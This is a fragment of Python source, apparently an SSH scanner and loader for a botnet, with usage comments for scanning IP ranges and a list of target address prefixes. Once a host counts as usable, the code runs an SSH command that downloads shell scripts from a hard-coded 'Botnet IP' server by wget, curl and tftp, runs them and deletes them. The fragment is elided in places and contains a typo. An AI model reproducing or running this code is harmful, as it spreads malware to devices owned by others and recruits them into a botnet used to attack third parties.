...
# python ZoneSec.py 376 LUCKY x 0 (LUCKY RANGES)
# python ZoneSec.py 376 B 113.53 1 (SCANNER EXAMPLE)
# python ZoneSec.py 376 RAND x all (IP RANDOMIZATION)
# 113.53, 125.26, 125.27, 125, 
# python ZoneSec.py 376 B 125.27 1
...
website = "89.34.99.189" # Botnet IP
        ...
        while 1:
			...
			lucky = ["201.13","197.23","187.89","37.236","191.53","161.18","191.53","186.208","1.0","177.137","177.38","101.108","125.27","177.44","179.189","179.97","125.17"]
                ...
                if badserver == False:
                        ...
                        ssh.exec_command("d /tmp; wget http://89.34.99.189/bins.sh || curl -O http://89.34.99.189/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 89.34.99.189 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 89.34.99.189; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh") #la
